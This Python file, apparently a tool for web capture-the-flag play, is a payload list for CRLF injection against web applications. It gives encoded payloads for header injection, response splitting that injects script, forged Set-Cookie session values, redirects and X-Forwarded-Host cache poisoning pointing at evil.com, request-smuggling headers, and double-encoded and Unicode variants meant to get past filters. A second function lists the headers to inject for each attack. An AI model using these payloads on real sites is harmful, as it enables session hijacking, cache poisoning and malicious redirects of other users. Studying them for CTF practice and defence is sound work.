"""
CRLF (Carriage Return Line Feed) Injection Payload Crafter for Web CTF.
Covers header injection, response splitting, and log poisoning via CRLF.
"""

from typing import List, Dict


def get_crlf_payloads() -> List[Dict[str, str]]:
    """Generate CRLF injection payloads for header injection and response splitting."""
    return [
        {
            "name": "Basic CRLF Header Injection",
            "payload": "%0d%0aX-Injected: true",
            "desc": "Injects a custom header via URL-encoded CRLF."
        },
        {
            "name": "Raw CRLF Header Injection",
            "payload": "\r\nX-Injected: true",
            "desc": "Raw CRLF characters to inject a header."
        },
        {
            "name": "CRLF Response Splitting",
            "payload": "%0d%0a%0d%0a<html><script>alert(1)</script></html>",
            "desc": "Double CRLF terminates headers and injects HTML body (XSS)."
        },
        {
            "name": "CRLF Set-Cookie Injection",
            "payload": "%0d%0aSet-Cookie: session=admin",
            "desc": "Injects a Set-Cookie header to hijack session."
        },
        {
            "name": "CRLF Location Redirect",
            "payload": "%0d%0aLocation: https://evil.com",
            "desc": "Injects a Location header to force redirect."
        },
        {
            "name": "CRLF Content-Length Confusion",
            "payload": "%0d%0aContent-Length: 0",
            "desc": "Injects Content-Length to cause request smuggling / cache poisoning."
        },
        {
            "name": "CRLF Cache Poisoning",
            "payload": "%0d%0aX-Forwarded-Host: evil.com",
            "desc": "Injects X-Forwarded-Host to poison cached responses."
        },
        {
            "name": "CRLF Log Poisoning",
            "payload": "%0d%0aUser-Agent: <script>alert(1)</script>",
            "desc": "Injects XSS into server logs via CRLF in User-Agent."
        },
        {
            "name": "CRLF with Tab (Header Continuation)",
            "payload": "%0d%0a%09X-Injected: true",
            "desc": "Tab continuation to bypass header filters."
        },
        {
            "name": "Double Encoded CRLF",
            "payload": "%250d%250aX-Injected: true",
            "desc": "Double URL-encoded CRLF bypasses single decode filters."
        },
        {
            "name": "Unicode CRLF",
            "payload": "%e5%98%8d%e5%98%8aX-Injected: true",
            "desc": "Unicode overlong encoding of CRLF (U+560D, U+560A)."
        },
        {
            "name": "CRLF via Newline Only",
            "payload": "%0aX-Injected: true",
            "desc": "Single newline (LF) injection."
        },
        {
            "name": "CRLF via Carriage Return Only",
            "payload": "%0dX-Injected: true",
            "desc": "Single carriage return (CR) injection."
        }
    ]


def get_crlf_headers_to_inject() -> List[Dict[str, str]]:
    """Common headers to inject via CRLF for various attacks."""
    return [
        {"header": "Set-Cookie", "value": "session=admin", "attack": "Session Hijacking"},
        {"header": "Location", "value": "https://evil.com", "attack": "Open Redirect"},
        {"header": "X-Forwarded-For", "value": "127.0.0.1", "attack": "IP Spoofing"},
        {"header": "X-Forwarded-Host", "value": "evil.com", "attack": "Cache Poisoning"},
        {"header": "Content-Length", "value": "0", "attack": "Request Smuggling"},
        {"header": "Transfer-Encoding", "value": "chunked", "attack": "Request Smuggling"},
        {"header": "X-XSS-Protection", "value": "0", "attack": "Disable XSS Filter"},
        {"header": "Refresh", "value": "0;url=https://evil.com", "attack": "Meta Redirect"},
        {"header": "Content-Type", "value": "text/html", "attack": "Content-Type Confusion"}
    ]
